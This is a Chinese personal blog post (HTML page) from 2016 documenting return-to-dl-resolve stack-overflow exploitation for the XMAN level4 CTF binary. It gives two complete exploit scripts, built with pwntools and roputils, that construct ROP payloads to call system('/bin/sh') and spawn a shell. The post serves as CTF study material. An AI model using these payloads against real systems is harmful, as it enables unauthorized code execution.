@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Linux栈溢出利用之return to dl-resolve实例 | 不要说话</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近学习了一下漏洞原理与利用，学习到栈溢出漏洞利用的一些技巧，记录下自己的学习心得。关于return to dl-resolve的原理，网上有许多的文章已经写的很清楚了，就不赘述。本文主要是根据return to dl-resolve的原理，实现32位和64位环境下的漏洞利用。 0x00.　准备知识(1) 实验环境： 64bit Ubuntu16.04, kernel : 4.4.0(2) 32位">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux栈溢出利用之return to dl-resolve实例">
+<meta property="og:url" content="http://yoursite.com/2016/10/07/PWN/Linux栈溢出利用之return-to-dl-resolve/index.html">
+<meta property="og:site_name" content="不要说话">
+<meta property="og:description" content="最近学习了一下漏洞原理与利用，学习到栈溢出漏洞利用的一些技巧，记录下自己的学习心得。关于return to dl-resolve的原理，网上有许多的文章已经写的很清楚了，就不赘述。本文主要是根据return to dl-resolve的原理，实现32位和64位环境下的漏洞利用。 0x00.　准备知识(1) 实验环境： 64bit Ubuntu16.04, kernel : 4.4.0(2) 32位">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-03-01T08:48:01.919Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux栈溢出利用之return to dl-resolve实例">
+<meta name="twitter:description" content="最近学习了一下漏洞原理与利用，学习到栈溢出漏洞利用的一些技巧，记录下自己的学习心得。关于return to dl-resolve的原理，网上有许多的文章已经写的很清楚了，就不赘述。本文主要是根据return to dl-resolve的原理，实现32位和64位环境下的漏洞利用。 0x00.　准备知识(1) 实验环境： 64bit Ubuntu16.04, kernel : 4.4.0(2) 32位">
+  
+    <link rel="alternate" href="/atom.xml" title="不要说话" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">不要说话</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PWN/Linux栈溢出利用之return-to-dl-resolve" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/07/PWN/Linux栈溢出利用之return-to-dl-resolve/" class="article-date">
+  <time datetime="2016-10-07T15:15:38.000Z" itemprop="datePublished">2016-10-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Security/">Security</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Linux栈溢出利用之return to dl-resolve实例
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近学习了一下漏洞原理与利用，学习到栈溢出漏洞利用的一些技巧，记录下自己的学习心得。关于return to dl-resolve的原理，网上有许多的文章已经写的很清楚了，就不赘述。本文主要是根据return to dl-resolve的原理，实现32位和64位环境下的漏洞利用。</p>
+<h3 id="0x00-准备知识"><a href="#0x00-准备知识" class="headerlink" title="0x00.　准备知识"></a>0x00.　准备知识</h3><p><strong>(1) 实验环境：</strong><br> 64bit Ubuntu16.04, kernel : 4.4.0<br><strong>(2) 32位与64位区别：</strong><br>Linux下32位应用的参数传递主要是通过栈来传递；而64位应用的前六个参数分别通过RDI, RSI, RDX, RCX, R8和 R9传递，如果有多余的参数，才会通过栈来传递。因此，在覆盖返回值时，平衡堆栈时就需要用到gadget。<br><strong>(3) return to dl-resolve</strong><br>Linux下可执行文件ELF的动态链接时，采用了延迟绑定技术。原理是：动态链接的库里有许多函数，但是可执行文件ELF不会全部调用这些函数，有些函数直到程序运行结束也不会被调用。因此，Linux下的链接器动态链接时不会进行函数地址重定位，而是等到函数第一次被调用时，进行函数地址重地位，也就是通过_dl_runtime_resolve函数到库中查找该函数的实际地址，并将其写入到该函数的got表中。<br>当栈溢出后，我们就可以控制程序流程到dl-resolve，解析出system函数的地址，从而实现漏洞的利用。</p>
+<h3 id="0x01-32位环境下的return-to-dl-resolve实例"><a href="#0x01-32位环境下的return-to-dl-resolve实例" class="headerlink" title="0x01.　32位环境下的return to dl-resolve实例"></a>0x01.　32位环境下的return to dl-resolve实例</h3><p>下面以XMAN level4为例，分别使用手写和使用工具roputils实现漏洞利用。<br><strong>return to dl-resolve by manul</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p = process(<span class="string">'./level4'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10086</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x8c</span></span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">vulfun = <span class="number">0x0804844b</span></span><br><span class="line">bss_addr = <span class="number">0x804a024</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">pppr = <span class="number">0x8048509</span></span><br><span class="line">p_ebp_r = <span class="number">0x804850b</span></span><br><span class="line">leave_r = <span class="number">0x80483b8</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>  </span><br><span class="line">    payload1 = <span class="string">'A'</span> * offset + p32(read_plt) + p32(pppr) + p32(<span class="number">0</span>) + p32(base_stage)</span><br><span class="line">    payload1 += p32(<span class="number">100</span>) + p32(p_ebp_r) + p32(base_stage) + p32(leave_r)</span><br><span class="line">    p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    plt_start = <span class="number">0x8048300</span></span><br><span class="line">    rel_plt = <span class="number">0x80482b0</span></span><br><span class="line">    index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">    dynsym_addr = <span class="number">0x80481cc</span></span><br><span class="line">    dynstr_addr = <span class="number">0x804822c</span></span><br><span class="line">    fake_sym = base_stage + <span class="number">36</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym - dynsym_addr) &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym = fake_sym +align</span><br><span class="line">    index_dynsym = (fake_sym - dynsym_addr) / <span class="number">0x10</span></span><br><span class="line">    r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">    fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">    st_name = (fake_sym + <span class="number">16</span>) - dynstr_addr</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">'B'</span> * <span class="number">4</span> + p32(plt_start) +p32(index_offset) + <span class="string">'C'</span>*<span class="number">4</span> + p32(base_stage+<span class="number">80</span>)</span><br><span class="line">    payload2 += <span class="string">'A'</span>*<span class="number">8</span> + fake_reloc + <span class="string">'D'</span>*align</span><br><span class="line">    payload2 += fake_sym + <span class="string">'system\x00'</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload2 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">100</span>, <span class="string">'A'</span>)  </span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p><strong>return to dl-resolve by roputils</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">fpath = <span class="string">'./level4'</span></span><br><span class="line">offset = <span class="number">0x8c</span></span><br><span class="line"></span><br><span class="line">rop = ROP(fpath)</span><br><span class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">addr_plt_read = <span class="number">0x08048310</span></span><br><span class="line">addr_got_read = <span class="number">0x0804a00c</span></span><br><span class="line"></span><br><span class="line">buf = rop.retfill(offset)</span><br><span class="line"><span class="comment"># roputils has changed call function in new version</span></span><br><span class="line">buf += rop.call(addr_plt_read, <span class="number">0</span>, addr_bss, <span class="number">100</span>)</span><br><span class="line">buf += rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	p = Proc(rop.fpath)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = Proc(host=<span class="string">'pwn2.jarvisoj.com'</span>, port=<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line">p.write(p32(len(buf)) + buf)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] read: %r"</span> % p.read(len(buf))</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line">buf += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"></span><br><span class="line">p.write(buf)</span><br><span class="line">p.interact(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02-参考文献："><a href="#0x02-参考文献：" class="headerlink" title="0x02.　参考文献："></a>0x02.　参考文献：</h3><p><a href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve" target="_blank" rel="noopener">1. ROP之return to dl-resolve</a><br><a href="http://www.evil0x.com/posts/19226.html" target="_blank" rel="noopener">2. 通过ELF动态装载构造ROP链（Return-to-dl-resolve）</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/10/07/PWN/Linux栈溢出利用之return-to-dl-resolve/" data-id="cje8aweo5001id8jqf28we2bc" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/10/07/PWN/Linux栈溢出利用之DynELF实例/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          Linux栈溢出利用之DynELF实例
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/10/07/PWN/Linux栈溢出漏洞利用小结/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">Linux栈溢出漏洞利用小结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Kategorien</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mobile-Security/">Mobile Security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Programming/">Programming</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/">Security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android-Reverse/">Android Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RegExp/">RegExp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/">ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/字符串处理/">字符串处理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/搜索算法/">搜索算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/树结构/">树结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/软件调试/">软件调试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android-Reverse/" style="font-size: 17.5px;">Android Reverse</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/PWN/" style="font-size: 20px;">PWN</a> <a href="/tags/RegExp/" style="font-size: 10px;">RegExp</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/ubuntu/" style="font-size: 12.5px;">ubuntu</a> <a href="/tags/字符串处理/" style="font-size: 10px;">字符串处理</a> <a href="/tags/搜索算法/" style="font-size: 15px;">搜索算法</a> <a href="/tags/树结构/" style="font-size: 10px;">树结构</a> <a href="/tags/软件调试/" style="font-size: 17.5px;">软件调试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/03/17/Mobile Security/ARM64-汇编语言/">ARM64 汇编语言</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/11/Mobile Security/ARM32-汇编语言/">ARM32 汇编语言</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/04/PWN/Linux堆漏洞之Use-after-free实例/">Linux堆漏洞之Use after free实例</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/01/PWN/Linux堆漏洞之off-by-one/">Linux堆漏洞之off-by-one</a>
+          </li>
+        
+          <li>
+            <a href="/2017/02/24/PWN/Linux堆漏洞之Double-free/">Linux堆漏洞之Double free</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 D0m021ng<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
